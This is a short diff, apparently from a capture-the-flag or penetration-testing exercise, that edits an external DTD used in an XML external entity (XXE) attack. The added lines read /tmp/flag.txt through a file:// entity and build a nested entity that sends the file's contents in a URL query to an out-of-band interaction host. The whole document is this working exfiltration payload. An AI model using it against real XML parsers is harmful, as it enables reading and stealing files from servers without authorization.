@@ -1,1 +1,3 @@
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/tmp/flag.txt">
+<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
+<!ENTITY % inject "<!ENTITY xxe SYSTEM 'http://d6iiomqsbufkkah58m70xka1bh1ed8k3u.oast.pro/?x=%file;'>">
+%inject;
